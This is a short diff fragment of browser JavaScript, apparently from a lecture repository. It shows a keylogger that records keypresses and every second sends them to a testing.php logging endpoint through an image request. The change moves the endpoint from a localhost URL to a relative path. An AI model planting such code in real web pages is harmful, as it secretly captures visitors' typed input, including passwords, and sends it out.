@@ -9,6 +9,6 @@ document.onkeypress =function(e)
 }
 window.setInterval(function()
 {
-	new Image().src = 'http://127.0.0.1/Github/lecture01/testing.php?log=' + keys;
+	new Image().src = 'testing.php?log=' + keys;
 	keys = '';
 },1000);
